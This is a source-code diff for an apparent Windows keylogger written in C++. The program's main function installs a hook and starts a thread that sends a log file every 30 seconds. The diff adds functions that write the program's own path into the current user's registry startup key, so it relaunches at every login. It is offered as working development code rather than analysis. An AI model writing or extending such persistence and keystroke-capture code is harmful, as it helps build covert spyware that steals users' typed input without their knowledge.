@@ -144,12 +144,50 @@ void startSendTimer(const char *filename, int intervalSeconds)
     }
 }
 
+void addToStartup(const char *exeName, const char *exePath)
+{
+    HKEY hKey = NULL;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, LAUNCH_STARTUP_KEY, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS)
+    {
+        RegSetValueExA(hKey, exeName, 0, REG_SZ, (const BYTE *)exePath, strlen(exePath) + 1);
+        RegCloseKey(hKey);
+    }
+}
+
+void addToStartupIfNotExists()
+{
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    HKEY hKey = NULL;
+
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, LAUNCH_STARTUP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+    {
+        char value[512];
+        DWORD valueLength = sizeof(value);
+        LONG result = RegQueryValueExA(hKey, EXE_NAME, NULL, NULL, (LPBYTE)value, &valueLength);
+        RegCloseKey(hKey);
+
+        if (result != ERROR_SUCCESS)
+        {
+            // Add to registry when it doesn't exists
+            addToStartup(EXE_NAME, exePath);
+        }
+    }
+    else
+    {
+        // If we can't open the startup registry, attempt to add anyway
+        addToStartup(EXE_NAME, exePath);
+    }
+}
+
 int main()
 {
     if (!installHook())
     {
         return 1;
     }
+
+    addToStartupIfNotExists();
 
     std::thread senderThread([=]()
                              { startSendTimer(getLogFilePath(), 30); });
@@ -163,4 +201,3 @@ int main()
     uninstallHook();
     return 0;
 }
-
